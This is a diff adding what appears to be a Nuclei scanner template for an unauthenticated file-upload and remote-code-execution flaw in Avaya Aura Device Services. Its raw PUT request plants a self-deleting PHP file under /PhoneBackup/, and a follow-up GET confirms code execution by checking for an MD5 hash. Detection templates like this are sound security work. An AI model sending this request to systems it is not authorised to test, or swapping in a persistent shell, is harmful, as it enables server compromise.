@@ -1,0 +1,44 @@
+id: avaya-aura-file-upload
+
+info:
+  name: Avaya Aura Device Services File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Avaya Aura Device Services versions 7.0 to 8.1.4.0 have a vulnerability allowing attackers to bypass authentication and upload arbitrary files, potentially gaining server permissions.
+  reference:
+    - https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/
+  tags: file-upload,rce
+
+variables:
+  file_name: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        PUT /PhoneBackup/{{file_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: AVAYA
+        Content-Type: application/x-www-form-urlencoded
+
+        <?php echo md5(233);unlink(__FILE__);?>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+
+  - raw:
+      - |
+        GET /PhoneBackup/{{file_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: AVAYA
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
